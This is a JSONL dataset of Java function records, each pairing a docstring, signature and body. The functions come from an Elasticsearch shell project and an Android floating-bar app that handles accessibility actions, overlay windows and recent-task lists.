{"docstring": "/**\n * Reads the input from the console and returns the input compilable source\n * @return the compilable source taken from the console as soon as it is compilable\n * @throws Exception\n */\n", "func_signal": "public CompilableSource read(String prompt) throws Exception", "code": "{\n\n    boolean previousLineWasEmpty = false;\n    int lineNumber = 0;\n    String source = \"\";\n\n    while(true) {\n        String line = console.readLine(lineNumber == 0 ? prompt : \"... \");\n        source = source + line + \"\\n\";\n        lineNumber++;\n\n        if (inputAnalyzer.isCompilable(source)) {\n            logger.debug(\"Source {} is compilable\", source);\n            break;\n        }\n\n        if (line.length() == 0) {\n            if (previousLineWasEmpty) {\n                return null;\n            }\n            previousLineWasEmpty = true;\n        }\n        logger.debug(\"Source {} isn't compilable, waiting for more input\", source);\n    }\n\n    return new CompilableSource(source, lineNumber);\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\source\\CompilableSourceReader.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/**\n * Creates the source reader given the console to read from and the input analyzer\n * @param console the console to read from\n * @param inputAnalyzer analyzer that determines whether a source is compilable or not\n */\n", "func_signal": "@Inject\npublic CompilableSourceReader(Console<PrintStream> console, InputAnalyzer inputAnalyzer)", "code": "{\n    this.console = console;\n    this.inputAnalyzer = inputAnalyzer;\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\source\\CompilableSourceReader.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/**\n * Keeps in sync the shell scope\n */\n", "func_signal": "@Override\npublic void run()", "code": "{\n    try {\n        syncIndexes(getIndexes());\n    } catch(Throwable t) {\n        logger.info(\"Error while synchronizing the scope\", t);\n    }\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\client\\ClientScopeSynchronizer.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "//Just a shortcut to get all the available indexes with their types and aliases\n", "func_signal": "public JsonOutput availableIndices(String... indices) throws Exception", "code": "{\n    ClusterStateResponse response = this.client.admin().cluster().state(new ClusterStateRequest()\n            .filterBlocks(true).filterNodes(true).filteredIndices(indices)\n            .filterRoutingTable(true)).actionGet();\n\n    XContentBuilder builder = JsonXContent.contentBuilder();\n    builder.startObject();\n    for (IndexMetaData indexMetaData : response.getState().metaData()) {\n        builder.startObject(indexMetaData.index());\n        if (indexMetaData.aliases() != null && indexMetaData.aliases().size() > 0) {\n            builder.startArray(\"aliases\");\n            for (String alias : indexMetaData.aliases().keySet()) {\n                builder.value(alias);\n            }\n            builder.endArray();\n        }\n        if (indexMetaData.mappings() != null && indexMetaData.mappings().size() > 0) {\n            builder.startArray(\"types\");\n            for (String alias : indexMetaData.mappings().keySet()) {\n                builder.value(alias);\n            }\n            builder.endArray();\n        }\n        builder.endObject();\n    }\n    builder.endObject();\n\n    return stringToJson.stringToJson(builder.string());\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\client\\AbstractClient.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/**\n * Converts an elasticsearch {@link ActionResponse} to native json\n * @param request the request that generated the given response\n * @param response the response to be converted\n * @return the native json representation of the response\n */\n", "func_signal": "@Override\nprotected JsonOutput responseToOutput(Request request, Response response)", "code": "{\n    try {\n        return stringToJson.stringToJson(toXContent(request, response, initContentBuilder()).string());\n    } catch (IOException e) {\n        logger.error(\"Error while generating the XContent response\", e);\n        return null;\n    }\n}", "path": "src\\main\\java\\org\\elasticsearch\\shell\\client\\builders\\AbstractRequestBuilderJsonOutput.java", "repo_name": "javanna/elasticshell", "stars": 107, "license": "apache-2.0", "language": "java", "size": 1842}
{"docstring": "/**\n * \u6a21\u62df\u8fd4\u56de\u952e API 16(Android 4.1)\u53ca\u4ee5\u4e0a\u624d\u80fd\u7528\n * \n * @param service\n */\n", "func_signal": "public static void virtualBack(AccessibilityService service)", "code": "{\n\tif (VERSION.SDK_INT < 16) {\n\t\tToast.makeText(service, \"Android 4.1\u53ca\u4ee5\u4e0a\u7cfb\u7edf\u624d\u652f\u6301\u6b64\u529f\u80fd\uff0c\u8bf7\u5347\u7ea7\u540e\u91cd\u8bd5\", 1).show();\n\t} else {\n\t\tservice.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);\n\t}\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\util\\Util.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n * \u6e05\u9664\u6240\u6709\u8bbe\u7f6e\u6570\u636e\n */\n", "func_signal": "public void clearPrefs()", "code": "{\n\tsharedPreferences.edit().clear().commit();\n\tToast.makeText(mContext, \"\u5df2\u6062\u590d\u5230\u9ed8\u8ba4\u8bbe\u7f6e\", 0).show();\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\util\\Prefs.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n * \u542f\u52a8\u7cfb\u7edf\u76f8\u673a\u754c\u9762\n */\n", "func_signal": "public static void openCamera(Context mContext)", "code": "{\n\tIntent intentCamera = new Intent();\n\tintentCamera.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n\tintentCamera.setAction(\"android.media.action.STILL_IMAGE_CAMERA\");\n\tmContext.startActivity(intentCamera);\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\util\\Util.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n * \u663e\u793a\u6d88\u606f\u4e2d\u5fc3\n */\n", "func_signal": "public static void openStatusBar(Context mContext)", "code": "{\n\t// \u5224\u65ad\u7cfb\u7edf\u7248\u672c\u53f7\n\tString methodName = (VERSION.SDK_INT <= 16) ? \"expand\" : \"expandNotificationsPanel\";\n\tdoInStatusBar(mContext, methodName);\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\util\\Util.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n * \u5173\u95ed\u6d88\u606f\u4e2d\u5fc3\n */\n", "func_signal": "public static void closeStatusBar(Context mContext)", "code": "{\n\t// \u5224\u65ad\u7cfb\u7edf\u7248\u672c\u53f7\n\tString methodName = (VERSION.SDK_INT <= 16) ? \"collapse\" : \"collapsePanels\";\n\tdoInStatusBar(mContext, methodName);\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\util\\Util.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n * \u5f97\u5230\u60ac\u6d6e\u7a97\u7684color\u989c\u8272\n * \n * @return\n */\n", "func_signal": "public int getColor()", "code": "{\n\tString color = sharedPreferences.getString(\"color\", \"green\");\n\tint colorInt = 0xff000000;\n\tif (color.equals(\"black\")) {\n\t\tcolorInt = 0xff000000;\n\t} else if (color.equals(\"white\")) {\n\t\tcolorInt = 0xffffffff;\n\t} else if (color.equals(\"blue\")) {\n\t\tcolorInt = 0xff6dcaec;\n\t} else if (color.equals(\"green\")) {\n\t\tcolorInt = 0xffb9e3d9;\n\t} else if (color.equals(\"red\")) {\n\t\tcolorInt = 0xffff7979;\n\t} else if (color.equals(\"orange\")) {\n\t\tcolorInt = 0xffffd060;\n\t}\n\treturn colorInt;\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\util\\Prefs.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n * \u865a\u62dfhome\u952e\n */\n", "func_signal": "public static void virtualHome(Context mContext)", "code": "{\n\t// \u6a21\u62dfHOME\u952e\n\tIntent i = new Intent(Intent.ACTION_MAIN);\n\ti.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // \u5982\u679c\u662f\u670d\u52a1\u91cc\u8c03\u7528\uff0c\u5fc5\u987b\u52a0\u5165new task\u6807\u8bc6\n\ti.addCategory(Intent.CATEGORY_HOME);\n\tmContext.startActivity(i);\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\util\\Util.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n * \u6062\u590d\u5230\u9ed8\u8ba4\u8bbe\u7f6e\n * \n * @param title\n * @param msg\n */\n", "func_signal": "public void showDialog(Context mContext, String title, String msg, String positiveMsg, String cancelMsg)", "code": "{\n\n\tAlertDialog.Builder builder;\n\tbuilder = new AlertDialog.Builder(mContext);\n\t\n\tbuilder.setTitle(title)\n\t.setPositiveButton(positiveMsg, new positiveListener())\n\t.setNegativeButton(cancelMsg, null)\n\t.setCancelable(false);// \u8bbe\u7f6e\u70b9\u51fb\u7a7a\u767d\u5904\uff0c\u4e0d\u80fd\u6d88\u9664\u8be5\u5bf9\u8bdd\u6846\n\t\n\tbuilder.setMessage(msg).create().show();\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\MainActivity.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "// long home key\n", "func_signal": "@Override\n\tpublic void onReceive(Context context, Intent intent)", "code": "{\n\t\tString action = intent.getAction();\n\t\tif (action.equals(Intent.ACTION_CLOSE_SYSTEM_DIALOGS)) {\n\t\t\tString reason = intent.getStringExtra(SYSTEM_REASON);\n\t\t\tif (reason != null) {\n\t\t\t\tif (reason.equals(SYSTEM_HOME_KEY)) {\n\t\t\t\t\tLog.e(\"homekey\", \"home\u952e\u88ab\u70b9\u51fb\");\n\t\t\t\t\tcontext.stopService(new Intent(context, DrawService.class));\n\t\t\t\t} else if (reason.equals(SYSTEM_RECENT_APPS)) {\n\t\t\t\t\tLog.e(\"homekey\", \"\u957f\u6309home\u952e\");\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}", "path": "FloatBar\\src\\com\\kale\\floatbar\\receiver\\HomeKeyReceiver.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n * \u81ea\u5b9a\u4e49view\n */\n", "func_signal": "@Override\npublic View getView(final int position, View convertView, ViewGroup parent)", "code": "{\n\tLayoutInflater mInflater = LayoutInflater.from(mContext);\n\tView infoView = mInflater.inflate(R.layout.app_item, null);\n\tImageView mImageView = (ImageView) infoView.findViewById(R.id.icon);\n\tTextView mTextView = (TextView) infoView.findViewById(R.id.title);\n\tmTextView.setTextColor(prefs.getDrawTextColor());\n\n\tString title = (String) mAppInfos.get(position).get(\"title\");\n\tDrawable icon = (Drawable) mAppInfos.get(position).get(\"icon\");\n\tIntent singleIntent = (Intent) mAppInfos.get(position).get(\"tag\");\n\n\tinfoView.setTag(singleIntent);\n\tmImageView.setImageDrawable(icon);\n\tmTextView.setText(title);\n\n\t// \u7ed1\u5b9a\u70b9\u51fb\u4e8b\u4ef6\uff0c\u7528\u6765\u8fdb\u884c\u5e94\u7528\u95f4\u7684\u8df3\u8f6c\n\tinfoView.setOnClickListener(new SingleAppClickListener());\n\treturn infoView;\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\adapter\\AppAdapter.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n * @param mySbuject\n *            \u7ed9\u5f00\u53d1\u8005\u53d1\u9001\u90ae\u4ef6\n */\n", "func_signal": "public static void sendMail(Context mContext, String mySbuject)", "code": "{\n\tString[] reciver = new String[] { \"developer_kale@qq.com\" };\n\t// \u6807\u9898\n\tString myCc = \"cc\";\n\t// \u5185\u5bb9\n\tString phoneName = android.os.Build.MODEL;\n\tString mybody = \"\u3010\" + mContext.getResources().getString(R.string.app_name) + \"\u3011\" + \"[\u6765\u81ea\" + phoneName + \"\u7528\u6237\u7684\u53cd\u9988]\";\n\n\tIntent myIntent = new Intent(android.content.Intent.ACTION_SEND);\n\tmyIntent.setType(\"plain/text\");\n\tmyIntent.putExtra(android.content.Intent.EXTRA_EMAIL, reciver);\n\tmyIntent.putExtra(android.content.Intent.EXTRA_CC, myCc);\n\tmyIntent.putExtra(android.content.Intent.EXTRA_SUBJECT, mySbuject);\n\tmyIntent.putExtra(android.content.Intent.EXTRA_TEXT, mybody);\n\tmContext.startActivity(Intent.createChooser(myIntent, mySbuject));\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\util\\Util.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n * \u5bf9windowManager\u8fdb\u884c\u8bbe\u7f6e\n * \n * @param wmParams\n * @return\n */\n", "func_signal": "public static WindowManager.LayoutParams getParams(WindowManager.LayoutParams wmParams)", "code": "{\n\twmParams = new WindowManager.LayoutParams();\n\t// \u8bbe\u7f6ewindow type \u4e0b\u9762\u53d8\u91cf2002\u662f\u5728\u5c4f\u5e55\u533a\u57df\u663e\u793a\uff0c2003\u5219\u53ef\u4ee5\u663e\u793a\u5728\u72b6\u6001\u680f\u4e4b\u4e0a\n\t// wmParams.type = LayoutParams.TYPE_PHONE;\n\t// wmParams.type = LayoutParams.TYPE_SYSTEM_ALERT;\n\twmParams.type = LayoutParams.TYPE_SYSTEM_ERROR;\n\t// \u8bbe\u7f6e\u56fe\u7247\u683c\u5f0f\uff0c\u6548\u679c\u4e3a\u80cc\u666f\u900f\u660e\n\twmParams.format = PixelFormat.RGBA_8888;\n\t// \u8bbe\u7f6e\u6d6e\u52a8\u7a97\u53e3\u4e0d\u53ef\u805a\u7126\uff08\u5b9e\u73b0\u64cd\u4f5c\u9664\u6d6e\u52a8\u7a97\u53e3\u5916\u7684\u5176\u4ed6\u53ef\u89c1\u7a97\u53e3\u7684\u64cd\u4f5c\uff09\n\t// wmParams.flags = LayoutParams.FLAG_NOT_FOCUSABLE;\n\t// \u8bbe\u7f6e\u53ef\u4ee5\u663e\u793a\u5728\u72b6\u6001\u680f\u4e0a\n\twmParams.flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE | WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL\n\t\t\t| WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN | WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR\n\t\t\t| WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH;\n\n\t// \u8bbe\u7f6e\u60ac\u6d6e\u7a97\u53e3\u957f\u5bbd\u6570\u636e\n\twmParams.width = WindowManager.LayoutParams.WRAP_CONTENT;\n\twmParams.height = WindowManager.LayoutParams.WRAP_CONTENT;\n\n\treturn wmParams;\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\util\\Util.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n * \u6a21\u62df\u6700\u8fd1\u4efb\u52a1\n * \n * @param service\n */\n", "func_signal": "public static void recentApps(AccessibilityService service)", "code": "{\n\tif (VERSION.SDK_INT < 16) {\n\t\tToast.makeText(service, \"Android 4.1\u53ca\u4ee5\u4e0a\u7cfb\u7edf\u624d\u652f\u6301\u6b64\u529f\u80fd\uff0c\u8bf7\u5347\u7ea7\u540e\u91cd\u8bd5\", 1).show();\n\t} else {\n\t\tservice.performGlobalAction(AccessibilityService.GLOBAL_ACTION_RECENTS);\n\t}\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\util\\Util.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n * \u6838\u5fc3\u65b9\u6cd5\uff0c\u52a0\u8f7d\u6700\u8fd1\u542f\u52a8\u7684\u5e94\u7528\u7a0b\u5e8f \u6ce8\u610f\uff1a\u8fd9\u91cc\u6211\u4eec\u53d6\u51fa\u7684\u6700\u8fd1\u4efb\u52a1\u4e3a MAX_RECENT_TASKS +\n * 1\u4e2a\uff0c\u56e0\u4e3a\u6709\u53ef\u80fd\u6700\u8fd1\u4efb\u52a1\u4e2d\u5305\u597dLauncher2\u3002 \u8fd9\u6837\u53ef\u4ee5\u4fdd\u8bc1\u6211\u4eec\u5c55\u793a\u51fa\u6765\u7684 \u6700\u8fd1\u4efb\u52a1 \u4e3a MAX_RECENT_TASKS \u4e2a\n * \u901a\u8fc7\u4ee5\u4e0b\u6b65\u9aa4\uff0c\u53ef\u4ee5\u83b7\u5f97\u8fd1\u671f\u4efb\u52a1\u5217\u8868\uff0c\u5e76\u5c06\u5176\u5b58\u653e\u5728\u4e86appInfos\u8fd9\u4e2alist\u4e2d\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u5c55\u793a\u8fd9\u4e2alist\u7684\u5de5\u4f5c\u4e86\u3002\n */\n", "func_signal": "public static void reloadButtons(Service service, List<HashMap<String, Object>> appInfos, int appNumber)", "code": "{\n\tint MAX_RECENT_TASKS = appNumber; // allow for some discards\n\tint repeatCount = appNumber;// \u4fdd\u8bc1\u4e0a\u9762\u4e24\u4e2a\u503c\u76f8\u7b49,\u8bbe\u5b9a\u5b58\u653e\u7684\u7a0b\u5e8f\u4e2a\u6570\n\n\t/* \u6bcf\u6b21\u52a0\u8f7d\u5fc5\u987b\u6e05\u7a7alist\u4e2d\u7684\u5185\u5bb9 */\n\tappInfos.removeAll(appInfos);\n\n\t// \u5f97\u5230\u5305\u7ba1\u7406\u5668\u548cactivity\u7ba1\u7406\u5668\n\tfinal Context context = service.getApplication();\n\tfinal PackageManager pm = context.getPackageManager();\n\tfinal ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);\n\n\t// \u4eceActivityManager\u4e2d\u53d6\u51fa\u7528\u6237\u6700\u8fd1launch\u8fc7\u7684 MAX_RECENT_TASKS + 1 \u4e2a\uff0c\u4ee5\u4ece\u65e9\u5230\u665a\u7684\u65f6\u95f4\u6392\u5e8f\uff0c\n\t// \u6ce8\u610f\u8fd9\u4e2a 0x0002,\u5b83\u7684\u503c\u5728launcher\u4e2d\u662f\u7528ActivityManager.RECENT_IGNORE_UNAVAILABLE\n\t// \u4f46\u662f\u8fd9\u662f\u4e00\u4e2a\u9690\u85cf\u57df\uff0c\u56e0\u6b64\u6211\u628a\u5b83\u7684\u503c\u76f4\u63a5\u62f7\u8d1d\u5230\u8fd9\u91cc\n\t@SuppressWarnings(\"deprecation\")\n\tfinal List<ActivityManager.RecentTaskInfo> recentTasks = am.getRecentTasks(MAX_RECENT_TASKS + 1, 0x0002);\n\n\t// \u8fd9\u4e2aactivity\u7684\u4fe1\u606f\u662f\u6211\u4eec\u7684launcher\n\tActivityInfo homeInfo = new Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_HOME).resolveActivityInfo(pm, 0);\n\tint numTasks = recentTasks.size();\n\tfor (int i = 0; i < numTasks && (i < MAX_RECENT_TASKS); i++) {\n\t\tHashMap<String, Object> singleAppInfo = new HashMap<String, Object>();// \u5f53\u4e2a\u542f\u52a8\u8fc7\u7684\u5e94\u7528\u7a0b\u5e8f\u7684\u4fe1\u606f\n\t\tfinal ActivityManager.RecentTaskInfo info = recentTasks.get(i);\n\n\t\tIntent intent = new Intent(info.baseIntent);\n\t\tif (info.origActivity != null) {\n\t\t\tintent.setComponent(info.origActivity);\n\t\t}\n\t\t/**\n\t\t * \u5982\u679c\u627e\u5230\u662flauncher\uff0c\u76f4\u63a5continue\uff0c\u540e\u9762\u7684appInfos.add\u64cd\u4f5c\u5c31\u4e0d\u4f1a\u53d1\u751f\u4e86\n\t\t */\n\t\tif (homeInfo != null) {\n\t\t\tif (homeInfo.packageName.equals(intent.getComponent().getPackageName()) && homeInfo.name.equals(intent.getComponent().getClassName())) {\n\t\t\t\tMAX_RECENT_TASKS = MAX_RECENT_TASKS + 1;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\t\t// \u8bbe\u7f6eintent\u7684\u542f\u52a8\u65b9\u5f0f\u4e3a \u521b\u5efa\u65b0task()\u3010\u5e76\u4e0d\u4e00\u5b9a\u4f1a\u521b\u5efa\u3011\n\t\tintent.setFlags((intent.getFlags() & ~Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED) | Intent.FLAG_ACTIVITY_NEW_TASK);\n\t\t// \u83b7\u53d6\u6307\u5b9a\u5e94\u7528\u7a0b\u5e8factivity\u7684\u4fe1\u606f(\u6309\u6211\u7684\u7406\u89e3\u662f\uff1a\u67d0\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u7684\u6700\u540e\u4e00\u4e2a\u5728\u524d\u53f0\u51fa\u73b0\u8fc7\u7684activity\u3002)\n\t\tfinal ResolveInfo resolveInfo = pm.resolveActivity(intent, 0);\n\t\tif (resolveInfo != null) {\n\t\t\tfinal ActivityInfo activityInfo = resolveInfo.activityInfo;\n\t\t\tfinal String title = activityInfo.loadLabel(pm).toString();\n\t\t\tDrawable icon = activityInfo.loadIcon(pm);\n\n\t\t\tif (title != null && title.length() > 0 && icon != null) {\n\t\t\t\tsingleAppInfo.put(\"title\", title);\n\t\t\t\tsingleAppInfo.put(\"icon\", icon);\n\t\t\t\tsingleAppInfo.put(\"tag\", intent);\n\t\t\t\tsingleAppInfo.put(\"packageName\", activityInfo.packageName);\n\t\t\t\tappInfos.add(singleAppInfo);\n\t\t\t}\n\t\t}\n\t}\n\tMAX_RECENT_TASKS = repeatCount;\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\util\\Util.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n * \u6267\u884c\u64cd\u4f5c\u7684\u65b9\u6cd5\uff0c\u6839\u636e\u4f20\u6765\u7684\u4e0d\u540c\u503c\u6267\u884c\u4e0d\u540c\u7684\u64cd\u4f5c\n * \n * @param service\n * @param event\n */\n", "func_signal": "private void doOperation(AccessibilityService service, String event)", "code": "{\n\tif (event.equals(\"openBar\")) {\n\t\tUtil.openStatusBar(mContext);\n\t} else if (event.equals(\"closeBar\")) {\n\t\tUtil.closeStatusBar(mContext);\n\t} else if (event.equals(\"openDraw\")) {\n\t\tmContext.startService(new Intent(mContext, DrawService.class));\n\t} else if (event.equals(\"recents\")) {\n\t\tUtil.recentApps(service);\n\t} else if (event.equals(\"back\")) {\n\t\tUtil.virtualBack(service);\n\t} else if (event.equals(\"home\")) {\n\t\tUtil.virtualHome(mContext);\n\t} else if (event.equals(\"camera\")) {\n\t\tUtil.openCamera(mContext);\n\t}\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\util\\Prefs.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "////////////////////////////////////////////////////////////////////////////\n", "func_signal": "private void createFloatView()", "code": "{\n\twmParams = Util.getParams(wmParams);\n\t// \u60ac\u6d6e\u7a97\u9ed8\u8ba4\u663e\u793a\u4ee5\u5de6\u4e0a\u89d2\u4e3a\u8d77\u59cb\u5750\u6807\n\twmParams.gravity = Gravity.RIGHT| Gravity.TOP;\n\tif (!prefs.isRightMode()) {\n\t\twmParams.gravity = Gravity.LEFT | Gravity.TOP;\n\t}\n\t// \u4ee5\u5c4f\u5e55\u53f3\u4e0a\u89d2\u4e3a\u539f\u70b9\uff0c\u8bbe\u7f6ex\u3001y\u521d\u59cb\u503c\uff0c\u786e\u5b9a\u663e\u793a\u7a97\u53e3\u7684\u8d77\u59cb\u4f4d\u7f6e\n\twmParams.x = 0;\n\twmParams.y = 0;\n\tmWindowManager = (WindowManager) service.getSystemService(Context.WINDOW_SERVICE);\n\tLayoutInflater inflater = LayoutInflater.from(service);\n\t// \u83b7\u53d6\u6d6e\u52a8\u7a97\u53e3\u89c6\u56fe\u6240\u5728\u5e03\u5c40\n\tmFloatLayout = (LinearLayout) inflater.inflate(R.layout.floating, null);\n\t// \u6dfb\u52a0\u60ac\u6d6e\u7a97\u7684\u89c6\u56fe\n\tmWindowManager.addView(mFloatLayout, wmParams);\n\t\n\t/**\n\t * \u8bbe\u7f6e\u60ac\u6d6e\u7a97\u7684\u70b9\u51fb\u3001\u6ed1\u52a8\u4e8b\u4ef6\n\t */\n\tsampleFloat = (ImageButton) mFloatLayout.findViewById(R.id.float_button_id);\n\tsampleFloat.getBackground().setAlpha(150);\n\tsampleFloat.setOnClickListener(new OnClickListener() {\n\t\t@Override\n\t\tpublic void onClick(View v) {\n\t\t\tprefs.doTouch(service);\n\t\t}\n\t});\n\t\n\t/**\n\t * \u8bbe\u7f6e\u6709\u65e0\u53cd\u9988\n\t */\n\tMyOnGestureListener listener = new MyOnGestureListener();\n\t@SuppressWarnings(\"deprecation\")\n\tfinal GestureDetector mGestureDetector = new GestureDetector(listener);\n\n\tsampleFloat.setOnTouchListener(new MyOnTouchListener(mGestureDetector));\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\service\\FloatService.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n * \u521d\u59cb\u5316windowsmanager\n */\n", "func_signal": "private void initDrawFloating()", "code": "{\n\tmWindowManager = (WindowManager) getApplication().getSystemService(Context.WINDOW_SERVICE);\n\twmParams = Util.getParams(wmParams);\n\twmParams.height = WindowManager.LayoutParams.MATCH_PARENT;\n\n\twmParams.x = 0;\n\twmParams.y = 0;\n\n\tinflater = LayoutInflater.from(getApplication());\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\service\\DrawService.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n * \u66f4\u65b0\u60ac\u6d6e\u7a97\u5e03\u5c40\u7b49\n */\n", "func_signal": "private void updateUi()", "code": "{\n\tRIGHT_MODE = !prefs.getDrawMode();\n\tDRAW_COLOR = prefs.getDrawColor();\n\tALPHA = prefs.getDrawAlpha();\n\n\t// \u83b7\u53d6\u6d6e\u52a8\u7a97\u53e3\u89c6\u56fe\u6240\u5728\u5e03\u5c40\n\tlayout = (LinearLayout) inflater.inflate(RIGHT_MODE ? R.layout.draw_right : R.layout.draw_left, null);\n\t// \u6dfb\u52a0\u60ac\u6d6e\u7a97\u7684\u89c6\u56fe\n\tmWindowManager.addView(layout, wmParams);\n\n\t/**\n\t * \u8bbe\u7f6e\u62bd\u5c49\u63a7\u4ef6\u7684\u6253\u5f00\u65b9\u5411\u548c\u76d1\u542c\u5668\n\t */\n\tmDrawerLayout = (DrawerLayout) layout.findViewById(R.id.drawer_layout);\n\tmDrawerLayout.setDrawerListener(new MyDrawListener());\n\tmDrawerLayout.openDrawer(RIGHT_MODE ? Gravity.RIGHT : Gravity.LEFT);\n\n\t/**\n\t * \u8bbe\u7f6e\u4e0a\u65b9\u7684home\u952e\n\t */\n\tButton home = (Button) layout.findViewById(R.id.home_key);\n\thome.setOnClickListener(new OnClickListener() {\n\t\t@Override\n\t\tpublic void onClick(View v) {\n\t\t\tUtil.virtualHome(getBaseContext());\n\t\t\tstopSelf();\n\t\t}\n\t});\n\n\t/**\n\t * \u8bbe\u7f6e\u62bd\u5c49\u63a7\u4ef6\u5185\u7684\u80cc\u666f\n\t */\n\tdrawContent = (LinearLayout) layout.findViewById(R.id.drawer_content);\n\tdrawContent.setBackgroundColor(DRAW_COLOR);\n\tdrawContent.getBackground().setAlpha(ALPHA);\n\n\t/**\n\t * \u8bbe\u7f6e\u6700\u8fd1\u4efb\u52a1list\u4e2ditem\u7684\u4e2a\u6570\uff1a20\n\t */\n\tUtil.reloadButtons(this, appInfos, 20);\n\tListView listView = (ListView) layout.findViewById(R.id.drawer_list);\n\tlistView.setAdapter(new AppAdapter(this, mWindowManager, layout, mDrawerLayout, appInfos));\n\n\t// \u60ac\u6d6e\u7a97\u663e\u793a\u786e\u5b9a\u53f3\u4e0a\u89d2\u4e3a\u8d77\u59cb\u5750\u6807\n\twmParams.gravity = RIGHT_MODE ? Gravity.RIGHT : Gravity.LEFT | Gravity.TOP;\n\t// \u4ee5\u5c4f\u5e55\u53f3\u4e0a\u89d2\u4e3a\u539f\u70b9\uff0c\u8bbe\u7f6ex\u3001y\u521d\u59cb\u503c\uff0c\u786e\u5b9a\u663e\u793a\u7a97\u53e3\u7684\u8d77\u59cb\u4f4d\u7f6e\n\t// \u6dfb\u52a0\u52a8\u753b\u3002\u53c2\u8003\u81ea\uff1ahttp://bbs.9ria.com/thread-242912-1-1.html\n\twmParams.windowAnimations = (RIGHT_MODE) ? R.style.right_anim : R.style.left_anim;\n\n\tmWindowManager.updateViewLayout(layout, wmParams);\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\service\\DrawService.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
{"docstring": "/**\n * @return \u624b\u673a\u5f53\u524d\u7684activity\n */\n", "func_signal": "@SuppressWarnings(\"deprecation\")\npublic static String getRunningActivityName(Context mContext)", "code": "{\n\tActivityManager activityManager = (ActivityManager) mContext.getSystemService(Context.ACTIVITY_SERVICE);\n\tString runningActivity = activityManager.getRunningTasks(1).get(0).topActivity.getClassName();\n\tSystem.out.println(\"running Activity = \" + runningActivity);\n\treturn runningActivity;\n}", "path": "FloatBar\\src\\com\\kale\\floatbar\\util\\Util.java", "repo_name": "kaleai/Float-Bar", "stars": 89, "license": "epl-1.0", "language": "java", "size": 700}
